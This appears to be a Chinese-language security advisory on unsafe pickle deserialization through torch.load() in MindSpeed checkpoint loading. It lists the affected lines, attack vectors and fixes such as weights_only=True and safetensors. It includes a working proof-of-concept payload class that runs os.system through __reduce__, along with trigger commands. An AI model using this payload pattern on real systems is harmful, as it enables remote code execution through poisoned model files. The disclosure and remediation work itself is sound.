# VULN-CROSS-TORCH-LOAD-001：跨模块Pickle反序列化漏洞致Checkpoint加载RCE

## 概要

**漏洞类型：** 反序列化 (CWE-502)  
**严重性：** Critical  
**置信度：** 95% (已确认)  
**CVSS评分：** 9.8 (Critical)  

MindSpeed 的 checkpoint 加载机制存在跨模块不安全反序列化漏洞。多个模块使用 `torch.load()` 时未设置 `weights_only=True` 参数，允许攻击者通过嵌入在 checkpoint 文件中的恶意 pickle payload 执行任意代码。

---

## 受影响文件

| 文件 | 行号 | 漏洞代码 |
|------|------|----------|
| `mindspeed/checkpointing.py` | 277 | `torch.load(checkpoint_name, map_location='cpu')` |
| `mindspeed/checkpointing.py` | 284 | `torch.load(checkpoint_name + ".ema", map_location='cpu')` |
| `mindspeed/checkpointing.py` | 310 | `torch.load(checkpoint_name, map_location='cpu')` |
| `mindspeed/core/distributed/layerzero/state/mga_checkpoint.py` | 188 | `torch.load(sd_file)` |
| `mindspeed/core/distributed/layerzero/state/scripts/layerzero_checkpointer.py` | 55 | `torch.load(self.filename, map_location='cpu')` |
| `mindspeed/core/distributed/layerzero/state/scripts/layerzero_checkpointer.py` | 110 | `torch.load(self.file_list[0], map_location=torch.device('cpu'))` |
| `mindspeed/core/distributed/layerzero/state/scripts/layerzero_checkpointer.py` | 127 | `torch.load(self.mp_rank_files[0], map_location=torch.device('cpu'))` |
| `mindspeed/core/distributed/layerzero/state/scripts/layerzero_checkpointer.py` | 135 | `torch.load(self.mp_rank_files[0], map_location=torch.device('cpu'))` |

---

## 攻击向量

### 攻击向量 1：命令行参数 (--load)

**入口点：** CLI 参数 `--load`

**数据流：**
```
CLI --load 参数
    ↓
args.load (arguments.py)
    ↓
load_dir 参数
    ↓
_load_base_checkpoint(checkpointing.py:204)
    ↓
checkpoint_name = get_checkpoint_name(load_dir, iteration, release)
    ↓
torch.load(checkpoint_name, map_location='cpu')  # 漏洞点
```

**漏洞函数：**
```python
# mindspeed/checkpointing.py:204-277
def _load_base_checkpoint(load_dir, rank0=False, sharded_state_dict=None,
                          exit_on_missing_checkpoint=False, checkpoint_step=None):
    # ...
    checkpoint_name = get_checkpoint_name(load_dir, iteration, release)
    # ...
    state_dict = torch.load(checkpoint_name, map_location='cpu')  # 无 weights_only=True
```

### 攻击向量 2：LayerZero YAML 配置

**入口点：** LayerZero 配置 YAML 文件

**数据流：**
```
layerzero_config.yaml (用户可控文件)
    ↓
ckpt_load_path: "/malicious/path"
    ↓
LayerzeroConfig.load_from_yaml() (config.py:73)
    ↓
config.ckpt_load_path
    ↓
load_layerzero_checkpoint(models, config.ckpt_load_path, ...) (config.py:271)
    ↓
sd_file = os.path.join(ckpt_dir, f"model_{rank}.pt")
    ↓
torch.load(sd_file)  # 漏洞点
```

**漏洞函数：**
```python
# mindspeed/core/distributed/layerzero/state/mga_checkpoint.py:177-188
def load_layerzero_checkpoint(models, ckpt_dir, optimizer=None, opt_param_scheduler=None):
    # ...
    sd_file = os.path.join(ckpt_dir, f"model_{rank}.pt")
    # ...
    state_dict = torch.load(sd_file)  # 无 weights_only=True
```

### 攻击向量 3：LayerZero Checkpointer 工具

**入口点：** 传递给 `LayerzeroCheckpoint` 类的 `ckpt_dir` 参数

**数据流：**
```
用户提供的 checkpoint 目录
    ↓
LayerzeroCheckpoint(ckpt_dir) (layerzero_checkpointer.py:91)
    ↓
self.file_list = self._get_files_by_key(ckpt_dir, MODEL_FILE_KEY)
    ↓
ShardStateDict(filename) → torch.load(self.filename)  # 漏洞点
```

---

## 攻击场景

### 场景 1：恶意模型分发

1. 攻击者创建包含嵌入 pickle payload 的恶意 checkpoint 文件
2. 攻击者在模型仓库分发该 checkpoint 作为"预训练模型"或直接分享
3. 受害者下载并使用 `--load /path/to/malicious/ckpt` 加载 checkpoint
4. 加载时，pickle payload 以受害者权限执行任意代码

### 场景 2：共享存储被入侵

1. 攻击者获得存储 checkpoint 的共享存储写入权限
2. 攻击者通过注入 pickle payload 修改 checkpoint 文件
3. 训练任务加载被入侵的 checkpoint 时，任意代码被执行
4. 可导致数据泄露、横向移动或系统入侵

### 场景 3：通过 LayerZero 配置的供应链攻击

1. 攻击者提供恶意 LayerZero 配置 YAML
2. 配置指定 `ckpt_load_path` 指向攻击者控制的位置
3. 该位置的恶意 checkpoint 文件包含 pickle payload
4. LayerZero 初始化期间发生代码执行

---

## 概念验证构造

### 步骤 1：创建恶意 Pickle Payload

```python
import torch
import pickle
import os

class MaliciousPayload:
    def __reduce__(self):
        # pickle 加载时将执行此代码
        cmd = "touch /tmp/pwned && echo 'VULNERABILITY CONFIRMED' > /tmp/pwned"
        return (os.system, (cmd,))

# 创建包含嵌入 payload 的虚假模型 state dict
malicious_state_dict = {
    'model': {'weight': torch.randn(10, 10)},
    'iteration': 1000,
    '__payload__': MaliciousPayload()  # 隐藏 payload
}

# 替代方案：直接使用 pickle 更隐蔽地嵌入 payload
import io
payload = pickle.dumps(MaliciousPayload())
# payload 可通过多种方式嵌入 checkpoint 文件
```

### 步骤 2：保存恶意 Checkpoint

```python
# 保存为有效 PyTorch checkpoint
torch.save(malicious_state_dict, 'malicious_checkpoint.pt')
# 或 EMA checkpoint 变体
torch.save(malicious_state_dict, 'malicious_checkpoint.pt.ema')
```

### 步骤 3：触发漏洞

```bash
# 通过 CLI 参数
python train.py --load /path/to/malicious_checkpoint

# 通过 LayerZero 配置
# 在 layerzero_config.yaml 中：
# ckpt_load_path: "/path/to/malicious/checkpoint/dir"
python train.py --layerzero-config layerzero_config.yaml
```

### 步骤 4：验证漏洞利用

```bash
ls -la /tmp/pwned
# 若文件存在，漏洞已成功利用
```

---

## 影响评估

### 机密性影响：HIGH
- 攻击者可通过执行代码读取任意文件
- 可窃取训练数据、模型权重和凭证
- 可访问环境变量和密钥

### 完整性影响：HIGH
- 攻击者可修改训练数据
- 可篡改模型权重植入后门
- 可损坏 checkpoint 和训练状态

### 可用性影响：HIGH
- 可导致拒绝服务
- 可损坏或删除关键文件
- 可崩溃训练任务

### 所需权限：NONE
- 攻击者只需提供恶意 checkpoint 文件
- 目标环境无需特殊权限

### 用户交互：REQUIRED
- 受害者必须加载恶意 checkpoint
- 这是 ML 工作流中的常见操作（迁移学习、微调）

---

## 根因分析

1. **缺少安全参数：** 所有 `torch.load()` 调用缺少 `weights_only=True`
2. **PyTorch 默认行为：** 默认情况下，`torch.load()` 使用 pickle 进行反序列化
3. **无内容验证：** 代码仅验证路径存在，不验证 checkpoint 完整性
4. **信任假设：** 代码信任指定路径的任何文件

### 与安全实现的对比

代码库中已存在安全实现参考：

```python
# mindspeed/mindspore/third_party/transformers/modeling_utils.py:56-60
def load_state_dict(
    checkpoint_file: Union[str, os.PathLike],
    is_quantized: bool = False,
    map_location: Optional[Union[str, torch.device]] = "cpu",
    weights_only: bool = True,  # 安全默认值
):
```

---

## 修复建议

### 立即修复（优先级：Critical）

为所有 `torch.load()` 调用添加 `weights_only=True`：

```python
# 修复前（有漏洞）
state_dict = torch.load(checkpoint_name, map_location='cpu')

# 修复后（安全）
state_dict = torch.load(checkpoint_name, map_location='cpu', weights_only=True)
```

### 需补丁的受影响文件

1. `mindspeed/checkpointing.py`：
   - 第 277 行：添加 `weights_only=True`
   - 第 284 行：添加 `weights_only=True`
   - 第 310 行：添加 `weights_only=True`

2. `mindspeed/core/distributed/layerzero/state/mga_checkpoint.py`：
   - 第 188 行：添加 `weights_only=True`

3. `mindspeed/core/distributed/layerzero/state/scripts/layerzero_checkpointer.py`：
   - 第 55 行：添加 `weights_only=True`
   - 第 110 行：添加 `weights_only=True`
   - 第 127 行：添加 `weights_only=True`
   - 第 135 行：添加 `weights_only=True`

### 附加安全措施

1. **添加 Checkpoint 验证：**
```python
def validate_checkpoint_path(path):
    """验证 checkpoint 路径是否在允许目录内。"""
    allowed_dirs = get_allowed_checkpoint_dirs()
    real_path = os.path.realpath(path)
    if not any(real_path.startswith(d) for d in allowed_dirs):
        raise SecurityError(f"Checkpoint 路径超出允许目录: {path}")
```

2. **添加完整性验证：**
```python
def load_checkpoint_secure(path, expected_hash=None):
    if expected_hash:
        verify_checkpoint_hash(path, expected_hash)
    return torch.load(path, map_location='cpu', weights_only=True)
```

3. **使用 Safetensors 格式：**
考虑迁移到 safetensors 格式存储模型权重，该格式不支持任意代码执行：
```python
from safetensors.torch import load_file
state_dict = load_file(checkpoint_path)  # 无任意代码执行
```

---

## 参考资料

- CWE-502：不可信数据反序列化
- PyTorch 安全公告：https://github.com/pytorch/pytorch/blob/main/SECURITY.md
- PyTorch 文档：https://pytorch.org/docs/stable/generated/torch.load.html
- Safetensors：https://github.com/huggingface/safetensors

---

## 发现信息

- **扫描工具：** 静态分析安全扫描器
- **检测模式：** 无 `weights_only` 参数的 `torch.load()` 调用
- **跨模块分析：** 在 checkpointing 和 layerzero 模块中发现漏洞调用集群

---

## 修复验证步骤

1. 应用添加 `weights_only=True` 的补丁
2. 运行现有测试套件验证功能
3. 尝试加载包含 pickle payload 的 checkpoint
4. 验证抛出 `UnpicklingError` 而非代码执行
5. 用合法 checkpoint 测试确保兼容性